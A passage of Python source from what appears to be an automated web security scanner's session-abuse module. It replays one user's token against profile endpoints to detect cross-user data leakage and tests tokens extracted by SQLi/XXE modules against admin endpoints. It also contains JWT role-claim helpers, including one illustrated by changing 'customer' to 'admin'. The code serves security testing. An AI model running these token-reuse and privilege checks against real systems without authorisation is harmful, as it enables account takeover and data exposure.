        if not self._user_personas or not self._user_personas.has_multiple_users:
            return findings

        pairs = self._user_personas.get_cross_user_pairs()
        if not pairs:
            return findings

        logger.info(f"[SESSION_ABUSE] Testing cross-session confusion with {len(pairs)} user pairs")

        # User-specific endpoints to test
        user_endpoints = [
            "/api/me", "/api/user", "/api/profile", "/api/account",
            "/rest/user/whoami", "/api/v1/me", "/me", "/userinfo",
        ]

        for attacker, victim in pairs[:3]:  # Limit to 3 pairs
            attacker_headers = attacker.auth_headers
            victim_headers = victim.auth_headers

            for path in user_endpoints:
                url = f"{base_url}{path}"

                try:
                    # First, get victim's data with victim's token
                    await rate_limiter.acquire()
                    async with session.get(url, headers=victim_headers, ssl=_SSL_CTX) as victim_resp:
                        if victim_resp.status != 200:
                            continue
                        victim_data = await victim_resp.text()

                    # Now try to access the same endpoint with attacker's token
                    await rate_limiter.acquire()
                    async with session.get(url, headers=attacker_headers, ssl=_SSL_CTX) as attacker_resp:
                        if attacker_resp.status != 200:
                            continue
                        attacker_data = await attacker_resp.text()

                    # Check if attacker got victim's data (session confusion)
                    if victim.email and victim.email in attacker_data:
                        findings.append(Finding(
                            vuln_type=VulnType.SESSION_HIJACKING,
                            name="Cross-Session Data Leakage",
                            severity=Severity.CRITICAL,
                            description=(
                                f"User '{attacker.email}' received data belonging to "
                                f"user '{victim.email}' from {path}. This indicates "
                                f"session confusion or improper user isolation."
                            ),
                            host=base_url,
                            endpoint=url,
                            evidence=[
                                f"Attacker: {attacker.email} (token from {attacker.persona_name})",
                                f"Victim data found: {victim.email}",
                                f"Endpoint: {path}",
                            ],
                            cvss_score=9.1,
                            cwe_id="CWE-639",
                            confidence_score=95.0,
                            remediation=(
                                "Ensure user data is strictly bound to the authenticated user's "
                                "session. Never cache user data without proper user-scoped keys."
                            ),
                            metadata={
                                "module": "session_abuse",
                                "attack_type": "cross_session_confusion",
                                "attacker_user": attacker.email,
                                "victim_user": victim.email,
                                "can_chain": True,
                            },
                        ).to_dict())
                        return findings  # Critical finding, stop testing

                    # Check if attacker got different user's ID in response
                    if victim.user_id and victim.user_id in attacker_data:
                        findings.append(Finding(
                            vuln_type=VulnType.SESSION_HIJACKING,
                            name="Cross-Session User ID Leakage",
                            severity=Severity.HIGH,
                            description=(
                                f"Attacker's request returned victim's user ID ({victim.user_id}). "
                                f"This may indicate improper session handling or caching issues."
                            ),
                            host=base_url,
                            endpoint=url,
                            evidence=[
                                f"Attacker: {attacker.email}",
                                f"Victim user_id in response: {victim.user_id}",
                            ],
                            cvss_score=7.5,
                            cwe_id="CWE-639",
                            confidence_score=85.0,
                            remediation="Review session management and user data isolation.",
                            metadata={
                                "module": "session_abuse",
                                "attack_type": "cross_session_id_leak",
                                "can_chain": True,
                            },
                        ).to_dict())

                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                    logger.debug(f"[SESSION_ABUSE] Cross-session test failed for {path}: {e}")

        return findings

    # ------------------------------------------------------------------
    # Utility methods
    # ------------------------------------------------------------------

    def _extract_user_id(self, data: dict[str, Any]) -> Optional[str]:
        """Extract user identifier from API response for identity comparison."""
        if not data:
            return None

        # Common user ID field names (in priority order)
        id_fields = [
            "id", "user_id", "userId", "uid", "sub",
            "email", "username", "login", "name",
        ]

        # Try top-level fields
        for field in id_fields:
            if field in data and data[field]:
                return str(data[field])

        # Try nested user object
        user_obj = data.get("user") or data.get("data") or data.get("profile")
        if isinstance(user_obj, dict):
            for field in id_fields:
                if field in user_obj and user_obj[field]:
                    return str(user_obj[field])

        return None

    def _get_jwt_exp_info(self, token: str) -> str:
        """Extract and format JWT expiration info."""
        try:
            parsed = JWTToken.parse(token)
            if not parsed:
                return "unparseable"

            exp = parsed.payload.get("exp")
            if not exp:
                return "no exp claim (never expires!)"

            now = time.time()
            remaining = exp - now

            if remaining <= 0:
                return "EXPIRED"
            elif remaining < 300:  # 5 minutes
                return f"expires in {int(remaining)}s (very short)"
            elif remaining < 3600:  # 1 hour
                return f"expires in {int(remaining/60)}m"
            elif remaining < 86400:  # 1 day
                return f"expires in {int(remaining/3600)}h"
            else:
                return f"expires in {int(remaining/86400)}d (long-lived)"
        except Exception:
            return "parse error"

    def _find_role_claims(
        self, payload: dict[str, Any],
    ) -> list[tuple[str, Any]]:
        """Find role/privilege claims in JWT payload (generic)."""
        found: list[tuple[str, Any]] = []

        # Top-level claims
        for key in ROLE_CLAIM_NAMES:
            if key in payload:
                found.append((key, payload[key]))

        # Nested claims (data.role, user.role, claims.role, realm_access.roles, etc.)
        for nested_key in ("data", "user", "claims", "realm_access", "resource_access"):
            nested = payload.get(nested_key)
            if isinstance(nested, dict):
                for key in ROLE_CLAIM_NAMES:
                    if key in nested:
                        found.append((f"{nested_key}.{key}", nested[key]))

        return found


    # ------------------------------------------------------------------
    # THEME-4: Test with Cross-Module Extracted Tokens
    # ------------------------------------------------------------------

    async def _test_cross_module_tokens(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        tokens: list[dict],
        rate_limiter: RateLimiter,
    ) -> list[dict]:
        """
        THEME-4: Test tokens extracted by other modules (SQLi, etc.).

        When SQLi extracts a JWT via auth bypass, we should test:
        1. Is the token still valid?
        2. What role does it grant?
        3. Can we access privileged endpoints?
        """
        findings: list[dict] = []

        if not tokens:
            return findings

        logger.info(f"[SESSION_ABUSE/THEME-4] Testing {len(tokens)} cross-module extracted tokens")

        # Privileged endpoints to test
        priv_endpoints = [
            "/api/admin", "/api/users", "/admin/config",
            "/rest/admin/application-configuration",
            "/api/v1/admin", "/management/users",
            "/api/me", "/rest/user/whoami",
        ]

        for token_info in tokens[:5]:  # Limit to 5 tokens
            token = token_info.get("token", "")
            source = token_info.get("_source_module", "unknown")

            if not token or len(token) < 10:
                continue

            headers = {"Authorization": f"Bearer {token}"}

            for path in priv_endpoints[:5]:
                url = f"{base_url}{path}"

                try:
                    await rate_limiter.acquire()
                    async with session.get(url, headers=headers, ssl=self._ssl_ctx) as resp:
                        if resp.status == 200:
                            body = await resp.text()

                            # Check if we got actual data (not error page)
                            if len(body) > 50 and "error" not in body.lower()[:100]:
                                findings.append(Finding(
                                    vuln_type=VulnType.SESSION_HIJACKING,
                                    name=f"Cross-Module Token Valid - Extracted via {source}",
                                    severity=Severity.CRITICAL,
                                    description=(
                                        f"Token extracted by {source} module grants access to {path}. "
                                        f"This confirms the SQLi/XXE attack chain to session abuse."
                                    ),
                                    host=base_url,
                                    endpoint=url,
                                    evidence=[
                                        f"Token source: {source}",
                                        f"Endpoint accessed: {path}",
                                        f"Response status: {resp.status}",
                                        f"Response preview: {body[:200]}...",
                                        "Chain: SQLi/XXE → Token Extraction → Session Abuse",
                                    ],
                                    cwe_id="CWE-384",
                                    cvss_score=9.1,
                                    metadata={
                                        "chain_type": "cross_module_token_abuse",
                                        "source_module": source,
                                        "token_preview": token[:50] + "..." if len(token) > 50 else token,
                                    },
                                    confidence_score=90.0,
                                ).to_dict())

                                logger.info(
                                    f"[SESSION_ABUSE/THEME-4] Cross-module token from {source} "
                                    f"grants access to {path}"
                                )
                                break  # Found access, move to next token

                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                    logger.debug(f"[SESSION_ABUSE/THEME-4] Token test failed: {e}")

        return findings


# ---------------------------------------------------------------------------
# Helper: deep set a nested value by dot-path in a dict
# ---------------------------------------------------------------------------

def _deep_set(d: dict, path: str, value: Any) -> dict:
    """Set a value at a dot-separated path in a nested dict.

    Example: _deep_set({"data": {"role": "customer"}}, "data.role", "admin")
    """
    keys = path.split(".")
    current = d
    for key in keys[:-1]:
        if key not in current or not isinstance(current[key], dict):
            current[key] = {}
        # Copy nested dicts to avoid mutating original
        current[key] = current[key].copy()
        current = current[key]
    current[keys[-1]] = value
    return d
